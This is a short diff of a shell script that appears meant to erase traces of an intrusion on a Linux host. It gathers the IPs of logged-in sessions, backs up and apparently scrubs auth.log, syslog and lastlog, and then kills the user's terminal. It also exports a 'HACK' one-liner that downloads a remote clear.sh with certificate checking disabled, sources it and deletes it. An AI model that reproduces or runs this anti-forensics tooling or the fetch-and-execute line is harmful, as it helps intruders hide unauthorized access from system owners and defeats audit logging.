@@ -22,7 +22,7 @@ function _resume {
 }
 
 echo "collection info for clear"
-last | grep "$my_pts" | awk '{ print $3}' | sort | uniq > $my_ips
+last | grep "still" |  grep "$my_pts" | awk '{ print $3}' | sort | uniq > $my_ips
 _bak /var/log/auth.log;
 _bak /var/log/syslog;
 _bak /var/log/lastlog;
@@ -38,12 +38,10 @@ function CL {
     fi
 }
 
-
-
 function Bye {
   CL
   _resume;
   pkill -9 $my_pts
 }
 
-export HACK=" wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' ; source clear.sh ; rm clear.sh"
+export HACK=" wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' ; source clear.sh ; rm clear.sh ; echo ok "
